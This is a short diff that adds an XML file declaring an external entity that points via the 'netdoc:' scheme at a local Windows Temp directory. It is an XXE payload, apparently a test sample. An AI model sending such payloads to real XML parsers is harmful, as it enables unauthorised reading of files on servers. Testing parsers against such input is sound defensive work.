@@ -1,0 +1,4 @@
+<!DOCTYPE test [
+	<!ENTITY xxe SYSTEM "netdoc:/C:\Users\中指狂魔pop子\AppData\Local\Temp">
+]>
+<wsw>&xxe;</wsw>
